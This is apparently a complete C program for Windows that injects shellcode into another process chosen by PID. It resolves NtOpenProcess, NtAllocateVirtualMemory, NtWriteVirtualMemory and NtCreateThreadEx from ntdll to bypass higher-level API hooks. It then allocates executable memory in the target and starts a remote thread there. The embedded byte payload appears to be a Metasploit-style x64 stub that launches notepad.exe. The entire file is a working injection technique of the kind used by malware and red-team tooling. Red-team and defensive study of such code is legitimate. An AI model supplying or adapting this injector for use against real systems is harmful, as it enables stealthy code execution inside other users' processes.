// Process Injection via NTDLL function calls NtOpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx API

#include <Windows.h>
#include <stdio.h>

int Error(const char* str) {
	printf("%s (%u)\n", str, GetLastError());
	return 1;
}

typedef struct _CLIENT_ID
{
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

#define InitializeObjectAttributes(p, n, a, r, s) \
{ \
	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
	(p)->RootDirectory = r; \
	(p)->Attributes = a; \
	(p)->ObjectName = n; \
	(p)->SecurityDescriptor = s; \
	(p)->SecurityQualityOfService = NULL; \
}

typedef struct _PS_ATTRIBUTE
{
	ULONG  Attribute;
	SIZE_T Size;
	union
	{
		ULONG Value;
		PVOID ValuePtr;
	} u1;
	PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T       TotalLength;
	PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef NTSTATUS(NTAPI* _NtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
typedef NTSTATUS(WINAPI* NAVM)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NWVM)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NCT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);


int main(int argc, const char* argv[]) {

	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x6e\x6f\x74"
		"\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

	if (argc < 2) {
		printf("Usage: RemoteThreadInjection <PID>\n");
		return 0;
	}

	LPVOID allocation_start;
	SIZE_T allocation_size = sizeof(shellcode);
	HANDLE hProcess, hThread;
	NTSTATUS status;

	OBJECT_ATTRIBUTES objAttr;
	int pid = atoi(argv[1]);
	CLIENT_ID cID;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	cID.UniqueProcess = (PVOID)pid;
	cID.UniqueThread = 0;
	HINSTANCE hNtdll = LoadLibrary(L"ntdll.dll");
	_NtOpenProcess NtOpenProcess = (_NtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
	NAVM NtAllocateVirtualMemory = (NAVM)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	NCT NtCreateThreadEx = (NCT)GetProcAddress(hNtdll, "NtCreateThreadEx");
	allocation_start = nullptr;
	status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cID);
	if (!hProcess)
		return Error("Failed to open process");
	status = NtAllocateVirtualMemory(hProcess, &allocation_start, 0, (PULONG)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	status = NtWriteVirtualMemory(hProcess, allocation_start, shellcode, sizeof(shellcode), 0);
	status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);

	WaitForSingleObject(hThread, 5000);
	//VirtualFreeEx(hProcess, buffer, 0, MEM_RELEASE);
	CloseHandle(hProcess);

	return 0;
}

